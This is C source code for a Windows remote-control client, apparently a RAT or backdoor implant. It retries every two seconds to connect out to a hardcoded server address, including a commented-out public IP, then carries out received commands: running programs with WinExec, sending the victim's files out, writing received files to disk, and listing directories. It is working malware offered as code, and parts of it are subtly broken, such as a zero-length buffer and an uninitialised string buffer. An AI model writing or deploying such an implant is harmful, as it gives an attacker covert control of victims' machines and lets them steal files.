/*
*保证客户端一直处于运行状态，等待服务端来进行连接。
*就算服务端退出，客户端也不会退出，继续运行。
*/
#include "stdafx.h"
#include<stdio.h>
#include<io.h>
#include<stdlib.h>
#include "tlymm.h"
#include "Winsock2.h"

#pragma comment(lib,"ws2_32.lib")


#define BUFFSIZE 8192
sockaddr_in serAddr;

//初始化socket编程环境
void init_socket(){
	
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
	wVersionRequested = MAKEWORD(1, 1);
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0)
	{
		return;
	}
	if (LOBYTE(wsaData.wVersion) != 1 ||
		HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return;
	}

}
int create_socket(int tcp){
	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET){
		printf("invalid socket !");
		return -1;
	}
	return sock;
}
int tcp_connect(int sock, const char *ip, const char *port){
	
	serAddr.sin_family = AF_INET;
	serAddr.sin_port = htons(atoi(port));
	serAddr.sin_addr.S_un.S_addr = inet_addr(ip);
	if (connect(sock, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
	{     printf("connect error !");
		  closesocket(sock);
		  return -1;
	}
	else{
		return 0;
	}
	
}
int tcp_recv(int sock,char *buf,int len){
	int rc = -1,i=0;
	while (1){
		rc = recv(sock, buf, len, 0);
		if (rc > 0){
			break;
		}
		i++;
		if (i == 3){
			break;
		}
	}
	return rc;
	
}
int tcp_send(int sock, char *buf, int len){
	int sd = -1,i=0;
	while (1){
		sd = send(sock, buf, len, 0);
		if (sd > 0){
			break;
		}
		i++;
		if (i == 3){
			break;
		}
	}
	return sd;
	
}
void close_socket(int sock){

	closesocket(sock);
}
void free_socket(){

	WSACleanup();
}


int exec(int sock, const char *cmd){
	char execute[256] = { 0 };
	sscanf(cmd, "%s", execute);
	int rs = WinExec(execute, SW_NORMAL);
	if (rs <= 31){
		tcp_send(sock, "fail", 4);
		return -1;
	}
	tcp_send(sock, "success", 7);
	return 0;
}
int get(int sock, const char *cmd){
	char srcfile[256] = { 0 };
	char desfile[256] = { 0 };
	sscanf(cmd, "%s %s", srcfile, desfile);
	FILE *p = fopen(srcfile, "rb");
	if (p){
		char buf[256] = { 0 };
		int len = fseek(p, 0, SEEK_END);
		len = ftell(p);
		if (len > 0){
			sprintf(buf, "%s %d", desfile, len);
			int ll = tcp_send(sock, buf, strlen(buf));
			if (ll <= 0){
				fclose(p);
				return -1;
			}
			memset(buf, 0, strlen(buf));
			int r = tcp_recv(sock, buf, sizeof(buf));
			if (r <= 0){
				fclose(p);
				return -1;
			}
			if (strcmp(buf, "OK") == 0){
				char *content = (char*)malloc(len);
				fseek(p, 0, SEEK_SET);
				fread(content, len, 1, p);
				int rc = 0;
				while (rc<len){
					int   aa = tcp_send(sock, &content[rc], len-rc);
					if (aa <= 0){
						free(content);
						fclose(p);
						return -1;
					}
					rc += aa;
				}
				free(content);
			}
		}
		fclose(p);
		memset(buf, 0, sizeof(buf));
		tcp_send(sock, "success", 7);
		return 0;
	}
	else{
		int i = tcp_send(sock, "fail", 4); 
		if (i <= 0){
			return -1;
		}
		return -1;
	}
	
}
int put(int sock, const char *cmd){
	char file[256] = { 0 };
	int len = 0;
	sscanf(cmd, "%s %d", file, &len);
	FILE *p = fopen(file, "wb");
	
	if (p&&len){
		char *buf = (char*)malloc(len);
		memset(buf, 0, len);
		int ts = tcp_send(sock, "OK", 2);
		if (ts <= 0){
			free(buf);
			fclose(p);
			return -1;
		}
		int rc = 0;
		while (rc < len){
			int aa = tcp_recv(sock, &buf[rc], len - rc);
			if (aa <= 0){
				free(buf);
				fclose(p);
				return -1;
			}
			rc += aa;
		}
		fwrite(buf, len, 1, p);
		free(buf);
		fclose(p);
		int st = tcp_send(sock, "success", 7);
		if (st <= 0){
			return -1;
		}
		return 0;
	}
	else{
		int i = tcp_send(sock, "fail", 4);
		if (i <= 0){
			return -1;
		}
		return -1;
	}
	

}



int ls(int sock, const char *cmd){

	char path[100] = { 0 };
	strcpy(path, cmd);

	struct _finddata_t fa;
	long handle;

	if ((handle = _findfirst(strcat(path, "*"), &fa)) == -1L)
	{
		tcp_send(sock, "fail", 4);
		return -1;
	}
	char *buf = (char *)malloc(BUFFSIZE);
	char s[] = { 0 };
	do
	{
		if ((fa.attrib == _A_ARCH || _A_HIDDEN || _A_RDONLY || _A_SUBDIR || _A_SYSTEM) && ~strcmp(fa.name, ".") && ~strcmp(fa.name, ".."))
		{
			strcat(buf, fa.name);
			strcat(buf, "  ");
			sprintf(s, "%d", fa.attrib);
			strcat(buf, s);
			strcat(buf, "\n");
			
		}
	} while (_findnext(handle, &fa) == 0); /* 成功找到时返回0*/

	
	_findclose(handle);
	tcp_send(sock, buf, strlen(buf));
	return 0;

}
int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	int sock = -1;
	//每隔两秒扫描一次，看是否有服务端链接，没有链接，则一直扫描下去
	//有链接就跳出扫描，执行接受指令
	goon:while (1){
		init_socket();//初始化socket环境，window下面需要初始化，linux下面不需要
		//建立一个tcp socket
		sock = create_socket(1);
		if (sock == -1){
			return 0;
		}
		//链接到目标服务器
		int rc = tcp_connect(sock, "192.168.102.128", "8080");
	    //int rc = tcp_connect(sock, "61.128.175.109", "8084");
		//int rc = tcp_connect(sock, "192.168.1.20", "8080");
		if (rc != -1){
			break;
			//return 0;
		}
		Sleep(2000);
	}
	

	char *buf = (char *)malloc(BUFFSIZE);
	
	
	while (1){
		
		memset(buf, 0, BUFFSIZE);
		int rc = tcp_recv(sock, buf, BUFFSIZE);
		if (rc <= 0){
			Sleep(2000);
			close_socket(sock);
			//释放socket环境，linux不需要
			free_socket();
			goto goon;
			//break;
		}


		if (strncmp(buf, "exec ", 5) == 0){
			exec(sock, &buf[5]);
		}
		if (strncmp(buf, "ls ", 3) == 0){
			ls(sock, &buf[3]);
			
		}
		if (strncmp(buf, "put ", 4) == 0){
			if (put(sock, &buf[4]) == -1){
				free(buf);
				close_socket(sock);
				//释放socket环境，linux不需要
				free_socket();
				goto goon;
			}
		}
		if (strncmp(buf, "get ", 4) == 0){
			
			if (get(sock, &buf[4]) == -1){
				free(buf);
				close_socket(sock);
				//释放socket环境，linux不需要
				free_socket();
				goto goon;
			}
		}

	}

	free(buf);

	close_socket(sock);
	//释放socket环境，linux不需要
	free_socket();
	return 0;
}


